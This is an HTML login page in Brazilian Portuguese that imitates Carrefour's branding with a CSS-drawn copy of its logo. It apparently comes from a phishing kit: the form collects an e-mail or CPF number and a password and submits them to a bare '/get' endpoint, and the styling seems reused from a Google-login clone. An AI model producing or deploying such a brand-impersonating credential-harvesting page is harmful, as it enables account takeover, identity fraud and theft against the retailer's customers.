<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .login-container {
      width: 90%;
      max-width: 400px;
      margin: auto;
      margin-top: 60px;
      padding: 30px 25px;
      border-radius: 10px;
      background: white;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }

    #logo {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 25px;
    }

    .logo-c {
      position: relative;
      width: 40px;
      height: 40px;
      margin-right: 10px;
    }

    .logo-c .blue {
      position: absolute;
      top: 0;
      left: 0;
      width: 20px;
      height: 40px;
      background: #0057a3;
      clip-path: polygon(0 0, 100% 50%, 0 100%);
    }

    .logo-c .red {
      position: absolute;
      top: 0;
      right: 0;
      width: 20px;
      height: 40px;
      background: #e30613;
      clip-path: polygon(100% 0, 0 50%, 100% 100%);
    }

    .logo-c .white {
      position: absolute;
      top: 4px;
      left: 15px;
      width: 10px;
      height: 32px;
      background: white;
      clip-path: polygon(0 0, 100% 50%, 0 100%);
    }

    .logo-text {
      font-size: 1.8rem;
      font-weight: 700;
      color: #007cc2;
    }

    .g-h1 {
      font-size: 22px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 6px;
      color: #007cc2;
    }

    .g-h2 {
      font-size: 14px;
      text-align: center;
      color: #444;
      margin-bottom: 25px;
    }

    .g-input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 15px;
    }

    .text {
      font-size: 13px;
      color: #5f6368;
      line-height: 1.4;
      margin-bottom: 20px;
    }

    .txt {
      color: #007cc2;
      text-decoration: none;
    }

    .txt:hover {
      text-decoration: underline;
    }

    .button-container {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .create-account {
      font-size: 14px;
      color: #007cc2;
      text-decoration: none;
    }

    .gbtn-primary {
      background-color: #007cc2;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }

    .gbtn-primary:hover {
      background-color: #005e93;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div id="logo">
      <div class="logo-c">
        <div class="blue"></div>
        <div class="white"></div>
        <div class="red"></div>
      </div>
      <div class="logo-text">Carrefour</div>
    </div>
    <form action="/get" id="email-form-step">
      <h1 class="g-h1">Login</h1>
      <h2 class="g-h2">Use sua conta do Carrefour</h2>
      <div class="login-content">
        <input name="email" type="text" class="g-input" placeholder="E-mail ou CPF" required>
        <input name="password" type="password" class="g-input" placeholder="Senha" required>
        <div class="text">
          Não é seu dispositivo? Use o modo visitante para mais segurança.
          <a href="#" class="txt">Saiba mais</a>
        </div>
        <div class="button-container">
          <a class="create-account" href="caca.html">Criar conta</a>
          <button class="gbtn-primary" type="submit">Avançar</button>
        </div>
      </div>
    </form>
  </div>
</body>
</html>
